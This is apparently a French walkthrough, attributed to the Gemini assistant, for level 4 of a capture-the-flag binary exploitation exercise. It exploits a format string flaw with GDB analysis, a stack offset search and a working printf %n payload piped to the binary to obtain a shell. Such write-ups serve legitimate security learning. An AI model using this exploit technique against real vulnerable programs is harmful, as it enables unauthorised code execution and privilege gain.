@@ -1,0 +1,32 @@
+Gemini a dit
+C'est exactement le même principe que le level 3, sauf que cette fois-ci, l'objectif est beaucoup plus "massif". Pour valider la condition, il faut écrire une valeur de plus de 16 millions dans la variable cible. Comme on ne va pas envoyer 16 millions de caractères "A" à la main (ce qui ferait planter le buffer ou prendrait une éternité), on utilise une astuce de printf pour générer ce volume virtuellement.
+
+Méthodologie du Level 4:
+Analyse comportementale: En testant le binaire, on observe exactement le même comportement que le level 3: le programme nous renvoie notre entrée. La faille de Format String est confirmée.
+
+Identification technique: La commande file ./level4 confirme que nous sommes toujours sur une architecture 32 bits.
+
+Exploration GDB: Dans gdb ./level4, on vérifie les points d'arrêt et le flux du programme.
+
+Le verdict du CMP: L'instruction 0x08048492 <+59>: cmp $0x1025544, %eax nous donne la clé. Le programme compare la variable à la valeur hexadécimale 0x1025544, ce qui équivaut à 16 930 116 en décimal.
+
+Localisation de la cible: Avec info variables m, on récupère l'adresse exacte de la variable globale suspecte: 0x08049810.
+
+Recherche de l'Offset: On doit savoir où se situe notre adresse sur la pile (Stack). On "brute-force" l'input du binaire avec cette commande:
+./level4 --> AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+En repérant 0x41414141 (le code ASCII de AAAA), on confirme que notre position est la 12ème.
+
+Construction du Payload (La Logique):
+Pour atteindre le nombre exact d'octets demandé par le cmp (16 930 116):
+
+L'adresse (4 octets): \x10\x98\x04\x08 occupe les 4 premiers emplacements.
+
+Le Padding (16 930 112 caractères): Au lieu d'écrire 16 millions de "A", on utilise %16930112d. Cette commande dit à printf: "Affiche un entier, mais réserve-lui une largeur de champ de 16 930 112 caractères".
+
+Le total: 4 (adresse)+16930112 (padding)=16930116. Le compte est parfait pour satisfaire le cmp.
+
+Exécution de l'attaque:
+On combine le tout dans une commande Python. L'utilisation du cat est indispensable pour garder le shell ouvert une fois que le programme aura fini de "mouliner" les 16 millions d'espaces et qu'il nous aura donné l'accès.
+
+(python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"'; cat) | ./level4
+Une fois lancée, attends quelques secondes que le terminal finisse d'afficher les espaces. Si tu vois un curseur vide, tape whoami.
